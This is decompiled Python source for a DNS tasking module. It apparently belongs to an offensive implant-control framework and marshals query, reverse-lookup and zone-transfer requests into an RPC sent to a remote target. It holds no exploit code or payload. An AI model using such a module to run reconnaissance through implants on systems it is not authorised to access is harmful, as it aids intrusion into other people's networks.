# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Dns_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.dns', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.dns.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.dns.Params()
    tgtParams.dnsServer = lpParams['dnsServer']
    tgtParams.type = lpParams['type']
    tgtParams.queryInfo = lpParams['target']
    tgtParams.protocol = lpParams['protocol']
    if tgtParams.type == mca.network.cmd.dns.PARAMS_TYPE_QUERY or tgtParams.type == mca.network.cmd.dns.PARAMS_TYPE_REVERSE_QUERY or tgtParams.type == mca.network.cmd.dns.PARAMS_TYPE_ZONE_TRANSFER:
        if tgtParams.queryInfo == None or len(tgtParams.queryInfo) == 0:
            mcl.tasking.OutputError('Invalid query or server name')
            return False
        if tgtParams.type == mca.network.cmd.dns.PARAMS_TYPE_REVERSE_QUERY:
            try:
                tgtParams.queryInfo = _getReverseAddr(tgtParams.queryInfo)
            except:
                mcl.tasking.OutputError('Failed to convert target IP to reverse format')
                return False

    rpc = mca.network.cmd.dns.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.dns.errorStrings)
        return False
    else:
        return True


def _getReverseAddr(ip):
    from mcl.object.IpAddr import IpAddr
    addr = IpAddr.CreateFromString(ip)
    if addr.GetType() != addr.IPADDR_TYPE_IPV4:
        raise RuntimeError('Given string is not an IPv4 address')
    return '%u.%u.%u.%u.in-addr.arpa' % (addr.GetAddr() & 255,
     addr.GetAddr() >> 8 & 255,
     addr.GetAddr() >> 16 & 255,
     addr.GetAddr() >> 24 & 255)


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)